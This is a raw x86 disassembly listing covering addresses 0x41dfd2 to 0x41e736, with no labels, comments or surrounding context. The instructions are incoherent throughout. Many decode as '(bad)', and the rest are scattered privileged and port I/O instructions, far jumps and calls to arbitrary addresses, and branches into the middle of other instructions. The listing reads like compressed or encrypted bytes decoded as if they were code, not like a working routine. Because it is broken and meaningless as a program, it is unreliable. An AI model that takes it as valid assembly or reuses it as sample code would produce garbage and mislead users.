  41dfd2:	repnz xchg edx,eax
  41dfd4:	js     0x41dfa5
  41dfd6:	mov    ds:0xe484f1b7,al
  41dfdb:	mov    edi,0xcd706232
  41dfe0:	mov    bh,0x43
  41dfe2:	dec    ebp
  41dfe3:	push   cs
  41dfe4:	mul    DWORD PTR [ebx]
  41dfe6:	pop    edx
  41dfe7:	push   ebx
  41dfe8:	(bad)
  41dfec:	dec    eax
  41dfed:	sbb    DWORD PTR [ecx],0xd311e8c3
  41dff3:	inc    ecx
  41dff4:	xchg   ecx,eax
  41dff5:	xchg   ecx,eax
  41dff6:	jo     0x41e037
  41dff8:	mov    eax,DWORD PTR [edx+ebx*1+0x47aeac90]
  41dfff:	pop    edi
  41e000:	dec    edx
  41e001:	loop   0x41dfb9
  41e003:	xchg   esi,edx
  41e005:	lods   al,BYTE PTR ds:[esi]
  41e006:	mov    edx,0xa3712c1
  41e00b:	mov    dl,0xb8
  41e00d:	std    
  41e00e:	(bad)  
  41e010:	call   0x4ba1f3e6
  41e015:	or     al,BYTE PTR [ebx-0x17]
  41e018:	fsubr  QWORD PTR [ecx]
  41e01a:	dec    ecx
  41e01b:	push   eax
  41e01c:	push   ss
  41e01d:	adc    ch,BYTE PTR [eax-0x3a]
  41e020:	and    ecx,edx
  41e022:	shl    edi,cl
  41e024:	pop    esp
  41e025:	test   DWORD PTR [edi],0xcd5343c2
  41e02b:	stos   BYTE PTR es:[edi],al
  41e02c:	mov    ch,BYTE PTR [esi+0x8]
  41e02f:	sbb    bl,al
  41e031:	outs   dx,DWORD PTR ds:[esi]
  41e032:	inc    ecx
  41e033:	ja     0x41e034
  41e035:	xor    eax,DWORD PTR [esi]
  41e037:	xchg   ecx,eax
  41e038:	sub    al,0x1b
  41e03a:	in     eax,0xfd
  41e03c:	leave  
  41e03d:	push   ds
  41e03e:	sti    
  41e03f:	sbb    ebp,eax
  41e041:	xor    eax,0x32e77708
  41e046:	sti    
  41e047:	ret    0x5c4b
  41e04a:	das    
  41e04b:	mov    es,WORD PTR [ecx-0x23]
  41e04e:	stos   DWORD PTR es:[edi],eax
  41e04f:	hlt    
  41e050:	popa   
  41e051:	push   0x22
  41e053:	mov    eax,ds:0xb299be79
  41e058:	pop    edi
  41e059:	mov    dh,0xa6
  41e05b:	lds    ebx,FWORD PTR [edi+0x26]
  41e05e:	fadd   DWORD PTR [eax-0x30]
  41e061:	or     al,0xe9
  41e063:	inc    ebp
  41e064:	shl    BYTE PTR [esi-0x62b890e3],cl
  41e06a:	out    0xc3,eax
  41e06c:	std    
  41e06d:	outs   dx,DWORD PTR ds:[esi]
  41e06e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e070:	cmp    edx,DWORD PTR [edi]
  41e072:	lock out dx,eax
  41e074:	test   al,0x33
  41e076:	jg     0x41e04c
  41e078:	dec    esi
  41e079:	jle    0x41e060
  41e07b:	int3   
  41e07c:	xor    esp,esi
  41e07e:	xchg   ebx,eax
  41e07f:	jbe    0x41e0d2
  41e081:	cmp    esp,DWORD PTR [ecx-0x11]
  41e084:	les    edi,FWORD PTR [edi-0x350a4a1b]
  41e08a:	lods   al,BYTE PTR ds:[esi]
  41e08b:	test   al,0x83
  41e08d:	dec    esp
  41e08e:	cli    
  41e08f:	aam    0xdb
  41e091:	sbb    ah,BYTE PTR [eax-0x294dd950]
  41e097:	sub    eax,0xc0d00490
  41e09c:	call   0xc20abc94
  41e0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a2:	xor    dl,dl
  41e0a4:	es pushf 
  41e0a6:	or     ecx,DWORD PTR [ebx-0x25a8ae78]
  41e0ac:	and    eax,0x39435b12
  41e0b1:	sbb    al,0x7d
  41e0b3:	fldcw  WORD PTR [edx+ebx*1+0xe]
  41e0b7:	sub    DWORD PTR [esi-0xb0d043b],esi
  41e0bd:	rcl    DWORD PTR [esi+0x7f67338a],0xc9
  41e0c4:	mul    al
  41e0c6:	test   eax,0x6e5942d
  41e0cb:	cs pop ebx
  41e0cd:	xchg   ebp,eax
  41e0ce:	add    al,ch
  41e0d0:	xchg   ebx,eax
  41e0d1:	add    ebx,DWORD PTR [edx]
  41e0d3:	imul   esp,ecx,0xffffffcd
  41e0d6:	sbb    ebp,DWORD PTR [ebp+0x3c8a5a84]
  41e0dc:	into   
  41e0dd:	xlat   BYTE PTR ds:[ebx]
  41e0de:	(bad)  
  41e0e0:	xor    BYTE PTR [eax],dl
  41e0e2:	cmp    BYTE PTR ds:0xa87c8e66,ch
  41e0e8:	daa    
  41e0e9:	aam    0x2a
  41e0eb:	sbb    ecx,0xd0926019
  41e0f1:	mov    eax,0x60e0670a
  41e0f6:	pop    esp
  41e0f7:	scas   eax,DWORD PTR es:[edi]
  41e0f8:	jb     0x41e0f2
  41e0fa:	xchg   edi,eax
  41e0fb:	lods   eax,DWORD PTR es:[esi]
  41e0fd:	sar    DWORD PTR [ebx-0x6e],1
  41e100:	ja     0x41e094
  41e102:	mov    ds:0xfe2e13df,eax
  41e107:	or     edx,esi
  41e109:	xor    edx,DWORD PTR [esi+0x2162118b]
  41e10f:	test   bl,bl
  41e111:	popa   
  41e112:	xor    cl,BYTE PTR [esi-0x5547aaa2]
  41e118:	mov    edx,DWORD PTR [esi+0x2c667451]
  41e11e:	sbb    al,0xcb
  41e120:	inc    esi
  41e121:	pusha  
  41e122:	xor    DWORD PTR [edx],eax
  41e124:	out    0x12,al
  41e126:	mov    bl,0x5f
  41e128:	int3   
  41e129:	adc    esp,DWORD PTR [edx]
  41e12b:	mov    bl,0x86
  41e12d:	rcl    BYTE PTR [edi],1
  41e12f:	fisub  DWORD PTR [ecx+0x3d787fe1]
  41e135:	jmp    0x3ef1:0xd5da35a0
  41e13c:	and    DWORD PTR [ebx],esp
  41e13e:	inc    ebp
  41e13f:	cdq    
  41e140:	pop    esi
  41e141:	mov    ds:0x1bc030e,eax
  41e146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e147:	mov    edx,0x70eaf46b
  41e14c:	and    ebp,DWORD PTR [eax+0x42b16de1]
  41e152:	push   ds
  41e153:	or     DWORD PTR [ecx-0x35],edi
  41e156:	(bad)  
  41e157:	push   esi
  41e158:	(bad)  
  41e159:	int    0x8b
  41e15b:	mov    BYTE PTR [edi+0x599e7937],bh
  41e161:	aam    0x49
  41e163:	or     eax,0x4d8d53cf
  41e168:	and    BYTE PTR [ecx],bh
  41e16a:	mov    ebx,0x8c3163a7
  41e16f:	xchg   edx,eax
  41e170:	add    ebx,DWORD PTR [ebx+0x14487b14]
  41e176:	pop    ebp
  41e177:	push   esi
  41e178:	xchg   ebp,eax
  41e179:	stc    
  41e17a:	or     esi,edi
  41e17c:	rol    BYTE PTR [eax-0x5db0478c],1
  41e182:	lods   al,BYTE PTR ds:[esi]
  41e183:	(bad)  
  41e184:	popa   
  41e185:	xchg   ebx,eax
  41e186:	push   0xd23075cc
  41e18b:	pop    ebx
  41e18c:	cld    
  41e18d:	xlat   BYTE PTR ds:[ebx]
  41e18e:	(bad)  
  41e18f:	in     eax,0xd1
  41e191:	stos   BYTE PTR es:[edi],al
  41e192:	int3   
  41e193:	lock aaa 
  41e195:	and    al,0x4c
  41e197:	aam    0xe1
  41e199:	mov    ds:0x61317c10,eax
  41e19e:	icebp  
  41e19f:	mov    DWORD PTR [ebx+0x29ca8ec1],esp
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	stc    
  41e1a7:	push   cs
  41e1a8:	or     al,0x88
  41e1aa:	int3   
  41e1ab:	imul   edx,DWORD PTR [edx-0x361bfafa],0x4298f042
  41e1b5:	jmp    0x41e1e3
  41e1b7:	inc    ebp
  41e1b8:	xor    DWORD PTR [ecx],esp
  41e1ba:	jge    0x41e1f8
  41e1bc:	xchg   ebx,eax
  41e1bd:	push   cs
  41e1be:	(bad)  
  41e1bf:	retf   
  41e1c0:	gs clc 
  41e1c2:	mov    ch,0x8d
  41e1c4:	or     BYTE PTR ds:[ebx+0x4b],cl
  41e1c8:	in     al,0x10
  41e1ca:	inc    edx
  41e1cb:	retf   
  41e1cc:	ret    
  41e1cd:	push   edx
  41e1ce:	lods   eax,DWORD PTR ds:[esi]
  41e1cf:	ins    BYTE PTR es:[edi],dx
  41e1d0:	nop
  41e1d1:	sar    BYTE PTR [ecx+0x2da098f6],cl
  41e1d7:	jmp    0x41e220
  41e1d9:	nop
  41e1da:	cmp    al,0xb8
  41e1dc:	adc    bl,BYTE PTR [edi+ebx*4]
  41e1df:	dec    esp
  41e1e0:	scas   eax,DWORD PTR es:[edi]
  41e1e1:	aam    0x3d
  41e1e3:	nop
  41e1e4:	aam    0x4d
  41e1e6:	adc    BYTE PTR [edx+0x8c2bc04],ah
  41e1ec:	xor    dl,BYTE PTR [eax]
  41e1ee:	xor    cl,BYTE PTR [esi]
  41e1f0:	pushf  
  41e1f1:	sub    BYTE PTR [ecx-0x23],al
  41e1f4:	out    0xfe,al
  41e1f6:	test   eax,0xc6597f20
  41e1fb:	xor    bh,al
  41e1fd:	mov    ebp,DWORD PTR [ecx+eax*2]
  41e200:	jo     0x41e26e
  41e202:	ret    0xde6
  41e205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e206:	out    0xfd,al
  41e208:	mov    ah,0xd
  41e20a:	ja     0x41e261
  41e20c:	pop    ds
  41e20d:	sbb    ecx,DWORD PTR [esi-0x3c54d58e]
  41e213:	adc    al,0xed
  41e215:	icebp  
  41e216:	inc    edi
  41e217:	iret   
  41e218:	or     BYTE PTR [edx],0xc7
  41e21b:	in     al,dx
  41e21c:	fs or  eax,0x9492e66f
  41e222:	pusha  
  41e223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e224:	je     0x41e2a4
  41e226:	(bad)
  41e22a:	fbld   TBYTE PTR [eax]
  41e22c:	in     eax,0x69
  41e22e:	add    ch,BYTE PTR [esi-0x4a022988]
  41e234:	pop    edx
  41e235:	neg    DWORD PTR es:[esi+0x64]
  41e239:	dec    esi
  41e23a:	shl    BYTE PTR [ebx],cl
  41e23c:	test   dl,ch
  41e23e:	and    BYTE PTR [edi+0x4f224555],bh
  41e244:	mov    eax,ds:0x8644fbcc
  41e249:	mov    dl,0x9c
  41e24b:	cmp    DWORD PTR [ebp-0x2524d14],ebp
  41e251:	push   DWORD PTR [edx+ebp*8-0x44039682]
  41e258:	sbb    al,BYTE PTR [edx]
  41e25a:	repnz enter 0x1f5a,0x16
  41e25f:	jmp    0x41e231
  41e261:	jnp    0x41e2ba
  41e263:	pop    es
  41e264:	adc    al,0xcb
  41e266:	(bad)  
  41e267:	aas    
  41e268:	pop    ebp
  41e269:	(bad)  
  41e26a:	iret   
  41e26b:	int    0x60
  41e26d:	jl     0x41e2cc
  41e26f:	xor    BYTE PTR [ebp-0x68ba7bf0],al
  41e275:	push   ecx
  41e276:	loope  0x41e246
  41e278:	test   eax,0x64bc10a
  41e27d:	fldl2e 
  41e27f:	mov    al,0xe5
  41e281:	mov    ah,0x51
  41e283:	or     cl,ch
  41e285:	sub    al,0xae
  41e287:	ins    DWORD PTR es:[edi],dx
  41e288:	add    al,0x68
  41e28a:	cmp    DWORD PTR [edx+0x975b4bb],ebx
  41e290:	xchg   edx,eax
  41e291:	lods   al,BYTE PTR ds:[esi]
  41e292:	push   esi
  41e293:	inc    edx
  41e294:	mov    bl,0xa4
  41e296:	mov    ebx,0x497e7837
  41e29b:	mov    esi,0x193a705e
  41e2a0:	adc    eax,0x85b0831c
  41e2a5:	ret    0xf257
  41e2a8:	lock ffreep st(3)
  41e2ab:	sub    eax,0xdca06648
  41e2b0:	xor    DWORD PTR [edx],0x30e7c4da
  41e2b6:	fild   DWORD PTR [ebp+0x5b6f33bb]
  41e2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2bd:	sub    DWORD PTR [edi],ebx
  41e2bf:	retf   
  41e2c0:	dec    ebx
  41e2c1:	nop
  41e2c2:	sub    al,0x3b
  41e2c4:	out    dx,eax
  41e2c5:	xor    al,0x2b
  41e2c7:	and    eax,0xb3bb0986
  41e2cc:	lea    edx,[esp+eax*2]
  41e2cf:	and    DWORD PTR [edx+0x5b],ebx
  41e2d2:	pop    ds
  41e2d3:	add    eax,0xd12e45f5
  41e2d8:	ins    DWORD PTR es:[edi],dx
  41e2d9:	push   es
  41e2da:	jbe    0x41e354
  41e2dc:	jnp    0x41e359
  41e2de:	ret    
  41e2df:	adc    BYTE PTR [ebp+0x14],0x3c
  41e2e3:	ret    0xd055
  41e2e6:	pop    edx
  41e2e7:	imul   esi,DWORD PTR [ebx+0x2269ac6e],0xf920f329
  41e2f1:	sti    
  41e2f2:	xchg   ebx,eax
  41e2f3:	cmp    al,0x97
  41e2f5:	push   ss
  41e2f6:	lahf   
  41e2f7:	cli    
  41e2f8:	or     ah,BYTE PTR [eax-0x249d334d]
  41e2fe:	enter  0x9fbb,0x62
  41e302:	test   DWORD PTR [ebp+0x36fbe512],0x10e0a506
  41e30c:	sub    BYTE PTR [eax],al
  41e30e:	cmp    DWORD PTR [ebx+0x21],0x816ce49a
  41e315:	sub    eax,0x71e4e972
  41e31a:	pop    es
  41e31b:	(bad)  
  41e31c:	shl    DWORD PTR [eax-0x31],cl
  41e31f:	add    DWORD PTR [edx+0x6916da24],esi
  41e325:	ins    DWORD PTR es:[edi],dx
  41e326:	pop    es
  41e327:	scas   al,BYTE PTR es:[edi]
  41e328:	add    al,BYTE PTR [eax]
  41e32a:	bound  edi,QWORD PTR [esi]
  41e32c:	or     al,0xef
  41e32e:	and    al,BYTE PTR ss:[eax]
  41e331:	in     al,dx
  41e332:	or     al,0xc5
  41e334:	jecxz  0x41e3a8
  41e336:	lock out dx,eax
  41e338:	xor    ch,cl
  41e33a:	addr16 stc 
  41e33c:	bnd jb 0x41e2e7
  41e33f:	nop
  41e340:	xor    al,0x8c
  41e342:	cmp    dl,BYTE PTR [eax]
  41e344:	int3   
  41e345:	xor    eax,0xecef8133
  41e34a:	or     DWORD PTR [edx-0x2c],0x7a055875
  41e351:	por    mm4,mm6
  41e354:	cld    
  41e355:	push   ss
  41e356:	arpl   cx,sp
  41e358:	pop    ecx
  41e359:	ins    DWORD PTR es:[edi],dx
  41e35a:	out    dx,eax
  41e35b:	xor    bh,BYTE PTR [esi]
  41e35d:	repz push esi
  41e35f:	int    0x38
  41e361:	xchg   edi,eax
  41e362:	out    0xb8,eax
  41e364:	dec    eax
  41e365:	test   BYTE PTR [esi-0x25d4fa94],ah
  41e36b:	fistp  QWORD PTR cs:[esi-0x23]
  41e36f:	jecxz  0x41e354
  41e371:	ror    al,1
  41e373:	mov    eax,0x1f867afb
  41e378:	xor    DWORD PTR [ebx],edx
  41e37a:	xchg   ecx,eax
  41e37b:	icebp  
  41e37c:	lea    edi,[ecx]
  41e37e:	das    
  41e37f:	inc    eax
  41e380:	std    
  41e381:	mov    dh,BYTE PTR [edi]
  41e383:	inc    ecx
  41e384:	xor    ch,BYTE PTR [esp+esi*4-0x5ff06c5e]
  41e38b:	mov    cl,0x2c
  41e38d:	std    
  41e38e:	jo     0x41e339
  41e390:	test   BYTE PTR ds:0xdf6c87c0,0x56
  41e397:	sbb    BYTE PTR [ebx],bh
  41e399:	inc    edi
  41e39a:	outs   dx,BYTE PTR ds:[esi]
  41e39b:	xchg   ecx,eax
  41e39c:	je     0x41e40d
  41e39e:	push   esp
  41e39f:	jp     0x41e3dd
  41e3a1:	push   ebx
  41e3a2:	inc    ecx
  41e3a3:	aas    
  41e3a4:	adc    BYTE PTR [edi+ecx*4-0x5e],0x63
  41e3a9:	stos   DWORD PTR es:[edi],eax
  41e3aa:	add    BYTE PTR [ebp+0x4e],dl
  41e3ad:	sbb    ch,ah
  41e3af:	pop    ss
  41e3b0:	call   0x103242f2
  41e3b5:	js     0x41e3f3
  41e3b7:	ss push ebx
  41e3b9:	shr    BYTE PTR [ecx],1
  41e3bb:	jns    0x41e436
  41e3bd:	int3   
  41e3be:	das    
  41e3bf:	clc    
  41e3c0:	mov    edi,0xedd4cb5a
  41e3c5:	inc    ecx
  41e3c6:	sbb    DWORD PTR [ebp+0x378a314b],eax
  41e3cc:	mov    al,ds:0x18659302
  41e3d1:	arpl   WORD PTR ds:0xc6eb636a,cx
  41e3d7:	push   esp
  41e3d8:	mov    ch,BYTE PTR ds:0xdadbb7ac
  41e3de:	fimul  DWORD PTR [edi-0x6dec4b7f]
  41e3e4:	aas    
  41e3e5:	and    edi,esp
  41e3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e8:	ss mov dl,0x25
  41e3eb:	sbb    al,0x96
  41e3ed:	jno    0x41e43d
  41e3ef:	mov    WORD PTR [ebp+0x67b2ae],ds
  41e3f5:	mov    dl,0xec
  41e3f7:	push   edi
  41e3f8:	xchg   edx,eax
  41e3f9:	inc    edx
  41e3fa:	enter  0x9e45,0x2f
  41e3fe:	sbb    al,0xfd
  41e400:	test   DWORD PTR [ebp+esi*2-0x5c42977b],0xbb9c33
  41e40b:	jmp    0xc4e8:0xf2ac25f4
  41e412:	call   0xbd34800b
  41e417:	pop    esp
  41e418:	and    eax,0x12ac4a9a
  41e41d:	(bad)  [edx+eiz*4-0x23]
  41e421:	pushf  
  41e422:	sub    DWORD PTR [ebp-0x32],eax
  41e425:	hlt    
  41e426:	sbb    cl,ah
  41e428:	push   esi
  41e429:	popa   
  41e42a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e42b:	int    0x3f
  41e42d:	pop    ss
  41e42e:	xchg   esp,eax
  41e42f:	xchg   edx,eax
  41e430:	sub    bl,ah
  41e432:	xsha256 (bad)
  41e433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e434:	xchg   edx,eax
  41e435:	es cmc 
  41e437:	and    BYTE PTR [ecx+0x12],bh
  41e43a:	xchg   dx,ax
  41e43c:	shl    DWORD PTR [esi],1
  41e43e:	jbe    0x41e3c3
  41e440:	enter  0xad0a,0xa3
  41e444:	dec    esp
  41e445:	stos   BYTE PTR es:[edi],al
  41e446:	in     eax,0xf5
  41e448:	adc    BYTE PTR [ebx-0x47],bh
  41e44b:	(bad)  
  41e44c:	call   0xa42eb6ca
  41e451:	(bad)  
  41e452:	popa   
  41e453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e454:	in     eax,0x16
  41e456:	fdivrp st(7),st
  41e458:	pop    edi
  41e45a:	mov    eax,ds:0xf9047763
  41e45f:	test   al,0x5e
  41e461:	mov    WORD PTR [ecx+0x6845a45a],ds
  41e467:	adc    esi,DWORD PTR [ecx-0x68e3ba8a]
  41e46d:	ficomp WORD PTR [ebp-0x3f]
  41e470:	inc    eax
  41e471:	scas   eax,DWORD PTR es:[edi]
  41e472:	and    al,0xe8
  41e474:	pop    edx
  41e475:	sbb    edx,DWORD PTR [edx-0x1b]
  41e478:	mov    cl,BYTE PTR ss:[edi+eax*8]
  41e47c:	fmul   DWORD PTR [ecx+ebp*8+0x460faa00]
  41e483:	es cwde 
  41e485:	inc    ecx
  41e486:	cmp    edx,edi
  41e488:	jbe    0x41e422
  41e48a:	jnp    0x41e507
  41e48c:	jmp    0x30e31c70
  41e491:	sub    dh,BYTE PTR [ebp+0x1c]
  41e494:	xchg   al,ch
  41e496:	add    eax,0x7880caff
  41e49b:	dec    edi
  41e49c:	sbb    DWORD PTR [edi-0x25576320],esi
  41e4a2:	repnz cmp al,0x14
  41e4a5:	ins    DWORD PTR es:[edi],dx
  41e4a6:	and    eax,0xd986bbc4
  41e4ab:	or     DWORD PTR [ecx+0x13],ecx
  41e4ae:	jnp    0x41e4ef
  41e4b0:	sub    al,0xc5
  41e4b2:	rcr    DWORD PTR [ebx-0x3e351e70],cl
  41e4b8:	mov    bh,0x83
  41e4ba:	cmp    esp,DWORD PTR [edi+0x7e2c7581]
  41e4c0:	das    
  41e4c1:	ror    ah,cl
  41e4c3:	adc    eax,0x54272cda
  41e4c8:	sub    ebp,DWORD PTR [ebx+0x75046f80]
  41e4ce:	dec    edx
  41e4cf:	scas   al,BYTE PTR es:[edi]
  41e4d0:	sbb    al,0x10
  41e4d2:	cmp    DWORD PTR [edi-0x663bb9ec],ecx
  41e4d8:	dec    edi
  41e4d9:	xchg   ebx,eax
  41e4da:	cs dec esp
  41e4dc:	js     0x41e4b4
  41e4de:	cmp    al,0xba
  41e4e0:	jnp    0x41e4a7
  41e4e2:	add    edx,ebp
  41e4e4:	xchg   esi,eax
  41e4e5:	arpl   WORD PTR [ebp-0x24],di
  41e4e8:	jmp    0x8109:0x5e6c829e
  41e4ef:	cs cmc 
  41e4f1:	push   ds
  41e4f2:	mov    ah,0x51
  41e4f4:	xor    ebx,DWORD PTR [edx+0x5cda0306]
  41e4fa:	pop    esi
  41e4fb:	mov    bl,0x27
  41e4fd:	inc    edx
  41e4fe:	or     DWORD PTR [edx+0x49],esp
  41e501:	dec    ecx
  41e502:	mov    eax,0xcb3ae01b
  41e507:	pop    esi
  41e508:	out    0xe0,eax
  41e50a:	lds    esp,FWORD PTR [eax]
  41e50c:	retf   0xedf5
  41e50f:	nop
  41e510:	lods   eax,DWORD PTR ds:[esi]
  41e511:	and    DWORD PTR [eax-0x3bba95fc],0xffffffe8
  41e518:	inc    eax
  41e519:	or     DWORD PTR [esi+0x3a],edi
  41e51c:	mov    ah,0x28
  41e51e:	fcomip st,st(2)
  41e520:	inc    ebx
  41e521:	sbb    edi,DWORD PTR [eax+0x5c405dfc]
  41e527:	sbb    DWORD PTR [edx+ebx*4],esi
  41e52a:	inc    edi
  41e52b:	mov    eax,ds:0x457222cc
  41e530:	(bad)  
  41e531:	mov    esi,0xf2858739
  41e536:	jecxz  0x41e53c
  41e538:	in     eax,dx
  41e539:	test   eax,0x992ad89f
  41e53e:	fst    DWORD PTR [edx]
  41e540:	cmp    DWORD PTR [edx],ebp
  41e542:	mov    BYTE PTR [esi],cl
  41e544:	cmp    DWORD PTR [edi+ebp*1+0x4402b14a],ecx
  41e54b:	call   0x2b802d2
  41e550:	mov    edi,0xda3dda01
  41e555:	stos   DWORD PTR es:[edi],eax
  41e556:	iret   
  41e557:	fidivr DWORD PTR [edx+eax*8]
  41e55a:	xchg   ebx,eax
  41e55b:	add    BYTE PTR [eax+0x182a78b8],0x7e
  41e562:	pop    ecx
  41e563:	mov    ch,0xb4
  41e565:	fld    DWORD PTR [edi+0x5ca63f37]
  41e56b:	cli    
  41e56c:	leave  
  41e56d:	(bad)  
  41e56e:	cmp    bl,BYTE PTR [ecx-0x4a835cc5]
  41e574:	stc    
  41e575:	ins    BYTE PTR es:[edi],dx
  41e576:	in     al,0xf5
  41e578:	daa    
  41e579:	and    al,0xe7
  41e57b:	xor    al,0xaa
  41e57d:	inc    ecx
  41e57e:	in     eax,dx
  41e57f:	repz cs aad 0x5f
  41e583:	pop    es
  41e584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e585:	test   eax,0x93a0709f
  41e58a:	aaa    
  41e58b:	ud1    ecx,DWORD PTR [eax+0x11]
  41e58f:	in     eax,0x67
  41e591:	int    0x50
  41e593:	call   0x2eba:0x3207d47d
  41e59a:	push   es
  41e59b:	add    esp,esp
  41e59d:	adc    esi,ebp
  41e59f:	sub    al,al
  41e5a1:	(bad)  [esi]
  41e5a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a4:	cmp    BYTE PTR [esi+eiz*1-0x1aa503aa],bh
  41e5ab:	ins    BYTE PTR es:[edi],dx
  41e5ac:	enter  0xb889,0x66
  41e5b0:	adc    DWORD PTR [ebx],edi
  41e5b2:	hlt    
  41e5b3:	jp     0x41e616
  41e5b5:	je     0x41e598
  41e5b7:	ins    DWORD PTR es:[edi],dx
  41e5b8:	sbb    BYTE PTR [ebx],dh
  41e5ba:	mov    ebp,0xb031664
  41e5bf:	mov    es,WORD PTR [eax+0x582e8c57]
  41e5c5:	fsubr  DWORD PTR [ecx-0x22]
  41e5c8:	in     al,dx
  41e5c9:	test   al,0xb2
  41e5cb:	sub    cl,ch
  41e5cd:	cmp    DWORD PTR [ebp+edx*1-0x39],ebx
  41e5d1:	sub    dl,BYTE PTR ds:[edx+0x49]
  41e5d5:	jmp    0x5700fc0c
  41e5da:	mov    ebx,0x67e7e31
  41e5df:	cdq    
  41e5e0:	jmp    0x41e565
  41e5e2:	jp     0x41e65f
  41e5e4:	push   0xd9e885ab
  41e5e9:	int    0xca
  41e5eb:	les    eax,FWORD PTR [esi]
  41e5ed:	xor    ebx,eax
  41e5ef:	aad    0xfa
  41e5f1:	push   0x23328b2a
  41e5f6:	or     dl,BYTE PTR [eax-0x6b333838]
  41e5fc:	jg     0x41e5d8
  41e5fe:	jns    0x41e5ef
  41e600:	ret    
  41e601:	jae    0x41e5ef
  41e603:	jl     0x41e610
  41e605:	and    al,0x25
  41e607:	jmp    0x41e599
  41e609:	mov    ds:0x130304f2,eax
  41e60e:	adc    eax,ebx
  41e610:	lods   eax,DWORD PTR ds:[esi]
  41e611:	adc    eax,0x9eddb81c
  41e616:	xor    DWORD PTR [esi],ecx
  41e618:	mov    edx,0x3f5ef24
  41e61d:	push   esp
  41e61e:	mov    ebx,0x98d45f91
  41e623:	into   
  41e624:	add    eax,0x7802aa06
  41e629:	inc    edi
  41e62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e62b:	jb     0x41e601
  41e62d:	clc    
  41e62e:	mov    edx,0x8a60cf0a
  41e633:	test   eax,0xd5fa7701
  41e638:	idiv   DWORD PTR [ebx-0x60]
  41e63b:	dec    esp
  41e63c:	aam    0x81
  41e63e:	and    eax,DWORD PTR [eax]
  41e640:	dec    ebx
  41e641:	inc    esi
  41e642:	jg     0x41e641
  41e644:	mov    edx,DWORD PTR [ebx]
  41e646:	jmp    0x1bbc:0x1e488495
  41e64d:	je     0x41e67a
  41e64f:	dec    esp
  41e650:	(bad)  
  41e651:	fadd   st,st(6)
  41e653:	sub    ah,BYTE PTR [ecx]
  41e655:	pop    ebp
  41e656:	retf   
  41e657:	and    edi,DWORD PTR [ecx]
  41e659:	adc    ebx,DWORD PTR [edi]
  41e65b:	xor    dl,BYTE PTR [edi-0x2bfc3467]
  41e661:	xchg   edx,eax
  41e662:	mov    ch,dh
  41e664:	pop    ebp
  41e665:	dec    edi
  41e666:	inc    esi
  41e667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e668:	loopne 0x41e5f2
  41e66a:	and    eax,0x7fa4620a
  41e66f:	sbb    esp,0x24
  41e672:	xchg   ebp,eax
  41e673:	in     eax,0xf6
  41e675:	lahf   
  41e676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e677:	jb     0x41e6bf
  41e679:	cmp    BYTE PTR [edi+ecx*4+0x2adb18f5],cl
  41e680:	(bad)  
  41e681:	cmp    ebp,eax
  41e683:	fst    st(4)
  41e685:	pushf  
  41e686:	icebp  
  41e687:	outs   dx,BYTE PTR ds:[esi]
  41e688:	xchg   esi,eax
  41e689:	jnp    0x41e6ca
  41e68b:	mov    ds:0x58022b7c,al
  41e690:	dec    ebp
  41e691:	shl    BYTE PTR [ebx+esi*8-0x6999ff9],0x4c
  41e699:	cmc    
  41e69a:	pop    edx
  41e69b:	rcr    esp,1
  41e69d:	sub    eax,0x89da7d38
  41e6a2:	inc    ecx
  41e6a3:	xchg   ecx,eax
  41e6a4:	sbb    bh,bh
  41e6a6:	int3   
  41e6a7:	mov    ecx,0x344d1aa6
  41e6ac:	dec    ebp
  41e6ad:	sub    al,0x70
  41e6af:	inc    esi
  41e6b0:	adc    edi,DWORD PTR [edi-0x52899b76]
  41e6b6:	out    0xce,al
  41e6b8:	mov    al,ds:0x89aad3bf
  41e6bd:	sbb    eax,0x84463136
  41e6c2:	lahf   
  41e6c3:	ret    0x7ace
  41e6c6:	jnp    0x41e702
  41e6c8:	imul   ebx,DWORD PTR ds:0xcc2d9d38,0x6f54f74f
  41e6d2:	jge    0x41e65f
  41e6d4:	test   esp,eax
  41e6d6:	xchg   ebx,eax
  41e6d7:	mov    dh,0x1d
  41e6d9:	lock fbld TBYTE PTR [esi+0x2e]
  41e6dd:	mov    ah,0x49
  41e6df:	fst    QWORD PTR [eax+0x8]
  41e6e2:	repz sti 
  41e6e4:	jbe    0x41e6ac
  41e6e6:	mov    cl,0x20
  41e6e8:	pop    ebp
  41e6e9:	aad    0x18
  41e6eb:	js     0x41e760
  41e6ed:	sbb    eax,0x81c2529f
  41e6f2:	pop    ds
  41e6f3:	or     edx,DWORD PTR [edi+0x12]
  41e6f6:	mov    cl,0x47
  41e6f8:	jp     0x41e76a
  41e6fa:	mov    DWORD PTR [esi+0x37a82bee],eax
  41e700:	sbb    BYTE PTR [esi+ecx*4],ch
  41e703:	inc    eax
  41e704:	daa    
  41e705:	(bad)  
  41e706:	sub    dl,BYTE PTR [edi+ecx*4]
  41e709:	mov    al,0x6d
  41e70b:	dec    ebx
  41e70c:	push   ss
  41e70d:	fidivr WORD PTR [esi]
  41e70f:	scas   eax,DWORD PTR es:[edi]
  41e710:	sbb    esp,DWORD PTR [ebp-0x1b]
  41e713:	daa    
  41e714:	ror    BYTE PTR [edi],0x26
  41e717:	ja     0x41e73a
  41e719:	push   edi
  41e71a:	leave  
  41e71b:	gs jmp 0x41e765
  41e71e:	push   eax
  41e71f:	mov    ah,0xe6
  41e721:	push   ebx
  41e722:	add    al,0x97
  41e724:	sbb    al,0x9
  41e726:	add    DWORD PTR [eax-0x48d6bd5e],0xf8957911
  41e730:	jbe    0x41e7ab
  41e732:	dec    eax
  41e733:	in     al,0xa6
  41e735:	push   es
  41e736:	xchg   ebx,eax
